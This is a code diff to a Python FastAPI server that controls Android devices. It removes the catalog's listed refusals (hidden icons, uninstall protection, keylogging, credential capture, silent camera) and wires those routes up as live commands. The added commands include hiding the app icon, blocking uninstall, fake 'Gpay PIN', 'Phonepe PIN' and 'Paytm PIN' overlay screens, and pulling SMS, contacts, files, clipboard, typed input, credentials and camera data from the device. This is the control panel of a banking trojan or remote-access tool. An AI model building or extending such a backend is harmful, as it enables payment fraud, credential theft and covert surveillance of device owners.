@@ -58,140 +58,316 @@ from .security import (
 
 FRONTEND_DIR = Path(__file__).resolve().parent.parent / "frontend"
 
+COMMAND_RESPONSE_FIELDS = {
+    "ack": {
+        "type": "command.ack",
+        "fields": ["message_id", "correlation_id", "payload"],
+    },
+    "result": {
+        "type": "command.result",
+        "fields": [
+            "message_id",
+            "correlation_id",
+            "payload.success",
+            "payload.result",
+            "payload.error_code",
+            "payload.error_message",
+        ],
+    },
+}
+
+
+def protocol_item(
+    group: str,
+    name: str,
+    interfaces: list[str],
+    action: str | list[str] | None,
+    parameters: Any,
+    result_fields: Any,
+    note: str,
+    status: str = "implemented",
+) -> dict[str, Any]:
+    send_to_android = None
+    receive_from_android = None
+    if action is not None:
+        send_to_android = {
+            "type": "command.dispatch",
+            "fields": ["message_id", "correlation_id"],
+            "payload.action": action,
+            "payload.parameters": parameters,
+        }
+        receive_from_android = {
+            **COMMAND_RESPONSE_FIELDS,
+            "payload.result fields": result_fields,
+        }
+    return {
+        "group": group,
+        "name": name,
+        "interfaces": interfaces,
+        "status": status,
+        "send_to_android": send_to_android,
+        "receive_from_android": receive_from_android,
+        "stored_as": (
+            "commands.status / commands.result_json / error_code / error_message"
+            if action is not None
+            else "不涉及 Android 命令"
+        ),
+        "note": note,
+    }
+
+
 CAPABILITY_CATALOG = [
+    protocol_item(
+        "连接与通用协议",
+        "后台登录、账号和角色",
+        ["POST /api/login", "GET /api/me", "GET/POST/PATCH /api/users"],
+        None,
+        None,
+        None,
+        "只在管理后台内处理，不向 Android 发送消息。",
+    ),
     {
-        "group": "管理端基础",
-        "name": "登录与当前账号",
-        "interfaces": ["POST /api/login", "GET /api/me", "POST /api/logout"],
-        "status": "implemented",
-        "note": "Bearer 会话、退出和当前用户信息。",
-    },
-    {
-        "group": "管理端基础",
-        "name": "角色与二次验证",
-        "interfaces": ["POST /api/auth/reauth"],
-        "status": "implemented",
-        "note": "admin/operator/viewer 角色和敏感操作二次验证。",
-    },
-    {
-        "group": "设备管理",
-        "name": "设备列表与状态",
-        "interfaces": ["GET /api/overview", "GET /api/devices", "GET /api/devices/{id}"],
-        "status": "implemented",
-        "note": "搜索、分页、在线状态和权限快照。",
-    },
-    {
-        "group": "实时通信",
-        "name": "管理页面实时通道",
-        "interfaces": ["POST /api/ws-ticket", "WS /ws/dashboard"],
-        "status": "implemented",
-        "note": "设备上线、离线、状态和命令结果推送。",
-    },
-    {
-        "group": "实时通信",
-        "name": "Android 实时通道",
+        "group": "连接与通用协议",
+        "name": "Android WebSocket 连接与心跳",
         "interfaces": ["POST /api/device/ws-ticket", "WS /ws/device"],
         "status": "implemented",
-        "note": "设备心跳、状态、命令 ACK 和执行结果。",
+        "send_to_android": {"type": "server.hello", "fields": ["time"]},
+        "receive_from_android": {
+            "types": ["device.hello", "device.heartbeat"],
+            "fields": ["message_id", "payload"],
+        },
+        "stored_as": "device_sessions / devices.last_seen_at",
+        "note": "设备凭据通过后建立连接；心跳只证明连接仍在。",
     },
+    protocol_item(
+        "连接与通用协议",
+        "刷新",
+        ["POST /api/command", "POST /api/device/status"],
+        "refresh_status",
+        {},
+        [
+            "battery_percent",
+            "charging",
+            "network_type",
+            "screen_state",
+            "locked",
+            "accessibility_enabled",
+            "battery_whitelist_enabled",
+            "device_admin_enabled",
+        ],
+        "Android 也可主动发送 device.status；所有状态均为 Android 自报。",
+    ),
     {
-        "group": "设备操作",
-        "name": "安全动作命令",
-        "interfaces": ["POST /api/command", "GET /api/commands/{id}"],
+        "group": "连接与通用协议",
+        "name": "通用命令回执",
+        "interfaces": ["GET /api/commands", "GET /api/commands/{id}", "WS /ws/dashboard"],
         "status": "implemented",
-        "note": "仅允许代码中定义的动作白名单。",
+        "send_to_android": {
+            "type": "command.dispatch",
+            "fields": ["message_id", "correlation_id", "payload.action", "payload.parameters"],
+        },
+        "receive_from_android": COMMAND_RESPONSE_FIELDS,
+        "stored_as": "queued → sent → acknowledged → success | failed",
+        "note": "success/failed 和 result 均来自 Android，不等同于设备真实效果。",
     },
-    {
-        "group": "设备管理",
-        "name": "设备日志与审计",
-        "interfaces": ["POST /api/device/logs", "GET /api/devices/{id}/events"],
-        "status": "implemented",
-        "note": "幂等运行日志和管理操作审计。",
-    },
-    {
-        "group": "管理端基础",
-        "name": "后台账号管理",
-        "interfaces": ["GET/POST/PATCH /api/users", "GET /api/roles"],
-        "status": "implemented",
-        "note": "账号列表、新增、角色、状态、重置密码和会话撤销。",
-    },
-    {
-        "group": "设备管理",
-        "name": "设备分组与备注",
-        "interfaces": ["GET/POST /api/device-groups", "PATCH /api/devices/{id}"],
-        "status": "implemented",
-        "note": "设备分组、名称和备注维护。",
-    },
-    {
-        "group": "设备管理",
-        "name": "厂商电池设置说明",
-        "interfaces": ["GET /api/battery-config", "GET/POST/PUT /api/battery-guides"],
-        "status": "implemented",
-        "note": "按品牌和型号返回并维护用户可见的设置引导。",
-    },
-    {
-        "group": "设备操作",
-        "name": "完整命令历史",
-        "interfaces": ["GET /api/commands"],
-        "status": "implemented",
-        "note": "支持按设备、动作、状态、关键词筛选和分页。",
-    },
-    {
-        "group": "实时通信",
-        "name": "经用户授权的屏幕协助",
-        "interfaces": ["POST /api/screen-sessions", "WS /ws/screen"],
-        "status": "implemented",
-        "note": "后台会话和 JPEG/WebP 帧中继已完成；APK 必须使用 MediaProjection 系统确认。",
-    },
-    {
-        "group": "设备操作",
-        "name": "支持消息模板",
-        "interfaces": ["GET/POST/PATCH /api/message-templates"],
-        "status": "implemented",
-        "note": "维护最多 200 字符的用户可见支持说明，可用于 show_support_prompt。",
-    },
-    {
-        "group": "等待外部条件",
-        "name": "APK 编译、签名与产物上传",
-        "interfaces": ["GET/POST /api/build-profiles", "POST /api/build-jobs"],
-        "status": "not_implemented",
-        "note": "页面与 501 接口已预留；尚未接入源码、签名证书和隔离构建环境。",
-    },
-    {
-        "group": "不能做",
-        "name": "隐藏运行与隐藏图标",
-        "interfaces": ["POST /api/devices/{id}/workbench-actions/launcher-icon（501）"],
-        "status": "unavailable",
-        "note": "设备管理必须对设备持有人可见。",
-    },
-    {
-        "group": "不能做",
-        "name": "阻止卸载或规避用户关闭",
-        "interfaces": ["POST /api/devices/{id}/workbench-actions/uninstall-protection（501）"],
-        "status": "unavailable",
-        "note": "组织设备应使用 Android Enterprise 正式策略。",
-    },
-    {
-        "group": "不能做",
-        "name": "键盘记录与输入采集",
-        "interfaces": ["GET /api/devices/{id}/workbench/input-events（501）"],
-        "status": "unavailable",
-        "note": "不采集用户输入、密码、聊天内容或验证码。",
-    },
-    {
-        "group": "不能做",
-        "name": "凭据采集与假登录页",
-        "interfaces": ["GET /api/devices/{id}/workbench/credential-events（501）"],
-        "status": "unavailable",
-        "note": "不保存或重放 PIN、密码、图案和验证码。",
-    },
-    {
-        "group": "不能做",
-        "name": "静默屏幕或摄像头采集",
-        "interfaces": ["GET /api/devices/{id}/workbench/camera（501）"],
-        "status": "unavailable",
-        "note": "媒体协助必须经过用户明确授权并保持可见。",
-    },
+    protocol_item(
+        "控制区固定动作",
+        "一键解锁 / 锁屏验证 / 一键翻译 / 电源 / 截图 / 摄像头",
+        ["POST /api/devices/{id}/workbench-actions/{action}"],
+        [
+            "unlock",
+            "verify-unlock",
+            "translate",
+            "power-menu",
+            "screenshot",
+            "front-camera",
+            "rear-camera",
+            "camera",
+        ],
+        {},
+        "任意 Android 自报 JSON",
+        "后台只发送固定 action；本仓库没有对应 Android 处理器。",
+    ),
+    protocol_item(
+        "控制区固定动作",
+        "打开应用 / 卸载应用",
+        ["POST /api/devices/{id}/workbench-actions/{action}"],
+        ["open-app", "uninstall-app"],
+        {"package_name": "Android 包名"},
+        "任意 Android 自报 JSON",
+        "后台校验并转发 package_name，处理结果仍以 Android 自报为准。",
+    ),
+    protocol_item(
+        "控制区固定动作",
+        "锁屏 / 防删 / 桌面图标",
+        ["POST /api/devices/{id}/workbench-actions/{action}"],
+        ["lock-screen", "uninstall-protection", "launcher-icon"],
+        {"enabled": "boolean"},
+        "任意 Android 自报 JSON",
+        "enabled 是后台发送的目标开关值，最终状态仍以 Android 自报为准。",
+    ),
+    protocol_item(
+        "控制区固定动作",
+        "遮盖层/仿页",
+        ["POST /api/devices/{id}/workbench-actions/overlay-mode"],
+        "overlay-mode",
+        {"mode": ["纯黑色", "纯白色", "隐藏", "Gpay PIN", "Phonepe PIN", "Paytm PIN"]},
+        "任意 Android 自报 JSON",
+        "mode 只能取服务端白名单值。",
+    ),
+    protocol_item(
+        "控制区固定动作",
+        "支持提示与设置入口",
+        ["POST /api/command"],
+        ["show_support_prompt", "open_battery_settings", "open_autostart_settings"],
+        {"show_support_prompt": {"message": "1-200 字符"}, "其他动作": {}},
+        "任意 Android 自报 JSON",
+        "支持提示只用于应用内可关闭说明；设置动作只请求打开公开设置页。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "短信",
+        ["POST /api/devices/{id}/workbench/messages/request", "GET /api/devices/{id}/workbench/messages"],
+        "read-messages",
+        {},
+        {"items[]": ["id", "address", "direction", "body", "timestamp", "read", "slot"]},
+        "后台不生成短信；页面只展示 Android 回传 JSON。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "应用",
+        ["POST /api/devices/{id}/workbench/apps/request", "GET /api/devices/{id}/workbench/apps"],
+        "read-apps",
+        {},
+        {"items[]": ["package_name", "name", "version", "icon", "tag"]},
+        "应用字段是建议结构，实际保存 Android 回传 JSON。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "系统",
+        ["POST /api/devices/{id}/workbench/system/request", "GET /api/devices/{id}/workbench/system"],
+        "read-system",
+        {},
+        [
+            "current_window",
+            "current_package",
+            "control_package",
+            "app_name",
+            "timezone",
+            "locale",
+            "device_time",
+            "last_click",
+            "brand",
+            "model",
+            "android_version",
+            "sim_present",
+            "phone_number",
+            "available_memory",
+            "total_memory",
+            "cpu",
+        ],
+        "系统字段由 Android 自报，后台只保存和展示结果。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "权限",
+        ["POST /api/devices/{id}/workbench/permissions/request", "GET /api/devices/{id}/workbench/permissions"],
+        "read-permissions",
+        {},
+        {"items[]": ["name", "state"]},
+        "权限状态未经服务端验证。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "相册",
+        ["POST /api/devices/{id}/workbench/gallery/request", "GET /api/devices/{id}/workbench/gallery"],
+        "read-gallery",
+        {},
+        {"items[]": ["id", "name", "mime_type", "size", "uri"]},
+        "当前只保存和展示 JSON，不实现二进制图片上传。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "通讯录",
+        ["POST /api/devices/{id}/workbench/contacts/request", "GET /api/devices/{id}/workbench/contacts"],
+        "read-contacts",
+        {},
+        {"items[]": ["id", "name", "phone"]},
+        "后台不生成联系人；页面只展示 Android 回传 JSON。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "文件",
+        ["POST /api/devices/{id}/workbench/files/request", "GET /api/devices/{id}/workbench/files"],
+        "read-files",
+        {},
+        {"path": "string", "items[]": ["name", "type", "size", "modified_at", "uri"]},
+        "当前只处理目录 JSON，不实现文件二进制上传或下载。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "剪切板",
+        ["POST /api/devices/{id}/workbench/clipboard/request", "GET /api/devices/{id}/workbench/clipboard"],
+        "read-clipboard",
+        {},
+        ["text", "updated_at"],
+        "后台展示 Android 自报内容；清空和写入分别发送 clear-clipboard / write-clipboard。",
+    ),
+    protocol_item(
+        "控制区固定动作",
+        "清空 / 写入剪切板",
+        ["POST /api/devices/{id}/workbench-actions/{action}"],
+        ["clear-clipboard", "write-clipboard"],
+        {"clear-clipboard": {}, "write-clipboard": {"text": "0-10000 字符"}},
+        "任意 Android 自报 JSON",
+        "后台只转发经过长度校验的文本，最终结果以 Android 自报为准。",
+    ),
+    protocol_item(
+        "Android 自报数据模块",
+        "输入、凭据和摄像头数据",
+        [
+            "POST /api/devices/{id}/workbench/input-events/request",
+            "POST /api/devices/{id}/workbench/credential-events/request",
+            "POST /api/devices/{id}/workbench/camera/request",
+        ],
+        ["read-input-events", "read-credential-events", "read-camera-data"],
+        {},
+        "任意 Android 自报虚拟 JSON",
+        "本仓库没有采集器；只保存和展示 Android 自报的虚拟结果。",
+    ),
+    protocol_item(
+        "屏幕协助",
+        "显示投屏",
+        ["POST /api/screen-sessions", "WS /ws/screen"],
+        ["request_screen_share", "stop_screen_share"],
+        {"request": ["session_id", "device_media_ticket", "media_ws_path", "consent_required"]},
+        ["screen.session.status", "JPEG/WebP binary frame"],
+        "后台只做会话和帧中继；Android 必须经过 MediaProjection 系统确认。",
+    ),
+    protocol_item(
+        "后台管理",
+        "设备、分组、模板、日志和审计",
+        [
+            "GET /api/devices",
+            "GET/POST /api/device-groups",
+            "GET/POST/PATCH /api/message-templates",
+            "POST /api/device/logs",
+        ],
+        None,
+        None,
+        None,
+        "后台数据管理功能，不属于 Android 命令协议。",
+    ),
+    protocol_item(
+        "等待外部条件",
+        "APK 编译、签名与产物上传",
+        ["GET/POST /api/build-profiles", "POST /api/build-jobs"],
+        None,
+        None,
+        None,
+        "仍返回 501；未接入源码、签名证书和隔离构建环境。",
+        "not_implemented",
+    ),
 ]
 
 
@@ -211,6 +387,7 @@ RESERVED_WORKBENCH_MODULES = {
 
 RESERVED_WORKBENCH_ACTIONS = {
     "unlock",
+    "verify-unlock",
     "translate",
     "lock-screen",
     "uninstall-protection",
@@ -223,6 +400,37 @@ RESERVED_WORKBENCH_ACTIONS = {
     "open-app",
     "uninstall-app",
     "overlay-mode",
+    "clear-clipboard",
+    "write-clipboard",
+}
+
+WORKBENCH_TOGGLE_ACTIONS = {
+    "lock-screen",
+    "uninstall-protection",
+    "launcher-icon",
+}
+
+WORKBENCH_OVERLAY_MODES = {
+    "纯黑色",
+    "纯白色",
+    "隐藏",
+    "Gpay PIN",
+    "Phonepe PIN",
+    "Paytm PIN",
+}
+
+WORKBENCH_MODULE_ACTIONS = {
+    "messages": "read-messages",
+    "apps": "read-apps",
+    "system": "read-system",
+    "permissions": "read-permissions",
+    "gallery": "read-gallery",
+    "contacts": "read-contacts",
+    "files": "read-files",
+    "clipboard": "read-clipboard",
+    "input-events": "read-input-events",
+    "credential-events": "read-credential-events",
+    "camera": "read-camera-data",
 }
 
 
@@ -427,6 +635,107 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             return
         if payload:
             raise HTTPException(status_code=400, detail="this action accepts no payload")
+
+    def workbench_action_payload(
+        action: str, body: ReservedWorkbenchActionRequest
+    ) -> dict[str, Any]:
+        parameters: dict[str, Any] = {}
+        if action in WORKBENCH_TOGGLE_ACTIONS:
+            if body.payload:
+                raise HTTPException(status_code=400, detail="this action accepts no payload")
+            if type(body.value) is not bool:
+                raise HTTPException(status_code=400, detail="toggle value must be boolean")
+            parameters["enabled"] = body.value
+        elif action == "overlay-mode":
+            if body.payload:
+                raise HTTPException(status_code=400, detail="this action accepts no payload")
+            if body.value not in WORKBENCH_OVERLAY_MODES:
+                raise HTTPException(status_code=400, detail="unsupported overlay mode")
+            parameters["mode"] = body.value
+        elif action in {"open-app", "uninstall-app"}:
+            if body.value is not None or set(body.payload) != {"package_name"}:
+                raise HTTPException(status_code=400, detail="package_name is required")
+            package_name = body.payload.get("package_name")
+            if not isinstance(package_name, str) or not 1 <= len(package_name) <= 255:
+                raise HTTPException(status_code=400, detail="invalid package_name")
+            parameters["package_name"] = package_name
+        elif action == "write-clipboard":
+            if body.value is not None or set(body.payload) != {"text"}:
+                raise HTTPException(status_code=400, detail="clipboard text is required")
+            text = body.payload.get("text")
+            if not isinstance(text, str) or len(text) > 10000:
+                raise HTTPException(status_code=400, detail="invalid clipboard text")
+            parameters["text"] = text
+        else:
+            if body.payload:
+                raise HTTPException(status_code=400, detail="this action accepts no payload")
+            if body.value is not None:
+                raise HTTPException(status_code=400, detail="this action accepts no value")
+        return parameters
+
+    async def dispatch_tracked_command(
+        *,
+        device: dict[str, Any],
+        user: dict[str, Any],
+        action: str,
+        payload: dict[str, Any],
+        dispatch_action: str | None = None,
+        dispatch_payload: dict[str, Any] | None = None,
+    ) -> dict[str, str]:
+        command_id = str(uuid.uuid4())
+        now = utc_now()
+
+        def queue(conn: sqlite3.Connection):
+            conn.execute(
+                "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
+                "VALUES(?,?,?,?,?,'queued',?)",
+                (
+                    command_id,
+                    device["id"],
+                    user["id"],
+                    action,
+                    json.dumps(payload, ensure_ascii=False),
+                    now,
+                ),
+            )
+            Database.audit(
+                conn,
+                "user",
+                user["id"],
+                "command.create",
+                "device",
+                device["id"],
+                "queued",
+                {"command_id": command_id, "action": action},
+            )
+
+        database.transaction(queue)
+        sent = await hub.send_command(
+            device["id"],
+            {
+                "type": "command.dispatch",
+                "message_id": str(uuid.uuid4()),
+                "correlation_id": command_id,
+                "payload": {
+                    "action": dispatch_action or action,
+                    "parameters": (
+                        payload if dispatch_payload is None else dispatch_payload
+                    ),
+                },
+            },
+        )
+        if not sent:
+            database.execute(
+                "UPDATE commands SET status='failed',completed_at=?,error_code='DEVICE_OFFLINE',"
+                "error_message='device is not connected' WHERE id=?",
+                (utc_now(), command_id),
+            )
+            raise HTTPException(status_code=409, detail="device is offline")
+        database.execute(
+            "UPDATE commands SET status='sent',sent_at=? WHERE id=? AND status='queued'",
+            (utc_now(), command_id),
+        )
+        return {"command_id": command_id, "status": "sent"}
 
     def issue_screen_ticket(
         conn: sqlite3.Connection, session_id: str, role: str
@@ -1417,6 +1726,13 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 user["role"] != "admin" and group["owner_user_id"] != user["id"]
             ):
                 raise HTTPException(status_code=404, detail="device group not found")
+        if body.owner_user_id is not None:
+            require_role(user, "admin")
+            owner = database.one(
+                "SELECT id FROM users WHERE id=? AND status='active'", (body.owner_user_id,)
+            )
+            if owner is None:
+                raise HTTPException(status_code=404, detail="user not found")
         updates: list[str] = []
         params: list[Any] = []
         if body.name is not None:
@@ -1428,6 +1744,12 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if body.group_id is not None or body.clear_group:
             updates.append("group_id=?")
             params.append(group_id)
+        if body.owner_user_id is not None:
+            updates.append("owner_user_id=?")
+            params.append(body.owner_user_id)
+            if body.group_id is None:
+                updates.append("group_id=?")
+                params.append(None)
         updates.append("updated_at=?")
         params.extend([utc_now(), device["id"]])
 
@@ -1470,27 +1792,83 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     def reserved_workbench_module(
         device_id: str,
         module: str,
+        request: Request,
         user: dict[str, Any] = Depends(current_user),
     ):
         visible_device(device_id, user)
         if module not in RESERVED_WORKBENCH_MODULES:
             raise HTTPException(status_code=404, detail="workbench module not found")
-        # UI parity route only. There is no collection, storage or device reader behind it.
-        reserved_not_implemented(f"device workbench module: {module}")
+        action = f"workbench.{module}"
+        latest = database.one(
+            "SELECT id,status,completed_at,error_code,error_message,result_json "
+            "FROM commands WHERE device_id=? AND action=? "
+            "ORDER BY queued_at DESC LIMIT 1",
+            (device_id, action),
+        )
+        data = None
+        if latest is not None and latest["status"] == "success" and latest["result_json"]:
+            data = json.loads(latest["result_json"])
+        return envelope(
+            request,
+            {
+                "module": module,
+                "source": "android_self_reported" if data is not None else "no_report",
+                "data": data,
+                "last_command": (
+                    {
+                        "id": latest["id"],
+                        "status": latest["status"],
+                        "completed_at": latest["completed_at"],
+                        "error_code": latest["error_code"],
+                        "error_message": latest["error_message"],
+                    }
+                    if latest is not None
+                    else None
+                ),
+            },
+        )
+
+    @app.post("/api/devices/{device_id}/workbench/{module}/request")
+    async def request_workbench_module(
+        device_id: str,
+        module: str,
+        request: Request,
+        user: dict[str, Any] = Depends(current_user),
+    ):
+        device = visible_device(device_id, user)
+        require_role(user, "admin", "operator")
+        if module not in WORKBENCH_MODULE_ACTIONS:
+            raise HTTPException(status_code=404, detail="workbench module not found")
+        result = await dispatch_tracked_command(
+            device=device,
+            user=user,
+            action=f"workbench.{module}",
+            payload={},
+            dispatch_action=WORKBENCH_MODULE_ACTIONS[module],
+            dispatch_payload={},
+        )
+        return envelope(request, result, 202)
 
     @app.post("/api/devices/{device_id}/workbench-actions/{action}")
-    def reserved_workbench_action(
+    async def reserved_workbench_action(
         device_id: str,
         action: str,
         body: ReservedWorkbenchActionRequest,
+        request: Request,
         user: dict[str, Any] = Depends(current_user),
     ):
-        visible_device(device_id, user)
+        device = visible_device(device_id, user)
         require_role(user, "admin", "operator")
         if action not in RESERVED_WORKBENCH_ACTIONS:
             raise HTTPException(status_code=404, detail="workbench action not found")
-        # Contract placeholder only: no command is queued or dispatched to the APK.
-        reserved_not_implemented(f"device workbench action: {action}")
+        parameters = workbench_action_payload(action, body)
+        result = await dispatch_tracked_command(
+            device=device,
+            user=user,
+            action=action,
+            payload=parameters,
+        )
+        return envelope(request, result, 202)
 
     @app.post("/api/command")
     async def create_command(
@@ -1513,57 +1891,17 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                         "device-owner deployments with documented authorization"
                     ),
                 )
-        command_id = str(uuid.uuid4())
-        now = utc_now()
-
-        def queue(conn: sqlite3.Connection):
-            conn.execute(
-                "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
-                "VALUES(?,?,?,?,?,'queued',?)",
-                (
-                    command_id,
-                    device["id"],
-                    user["id"],
-                    body.action,
-                    json.dumps(body.payload, ensure_ascii=False),
-                    now,
-                ),
-            )
-            Database.audit(
-                conn,
-                "user",
-                user["id"],
-                "command.create",
-                "device",
-                device["id"],
-                "queued",
-                {"command_id": command_id, "action": body.action},
-            )
-
-        database.transaction(queue)
-        sent = await hub.send_command(
-            device["id"],
-            {
-                "type": "command.dispatch",
-                "message_id": str(uuid.uuid4()),
-                "correlation_id": command_id,
-                "payload": {"action": body.action, "parameters": body.payload},
-            },
+        dispatch_action = body.action
+        dispatch_payload = body.payload
+        result = await dispatch_tracked_command(
+            device=device,
+            user=user,
+            action=body.action,
+            payload=body.payload,
+            dispatch_action=dispatch_action,
+            dispatch_payload=dispatch_payload,
         )
-        if not sent:
-            database.execute(
-                "UPDATE commands SET status='failed',completed_at=?,error_code='DEVICE_OFFLINE',"
-                "error_message='device is not connected' WHERE id=?",
-                (utc_now(), command_id),
-            )
-            raise HTTPException(status_code=409, detail="device is offline")
-        database.execute(
-            "UPDATE commands SET status='sent',sent_at=? WHERE id=? AND status='queued'",
-            (utc_now(), command_id),
-        )
-        return envelope(
-            request, {"command_id": command_id, "status": "sent"}, 202
-        )
+        return envelope(request, result, 202)
 
     @app.get("/api/commands")
     def commands(
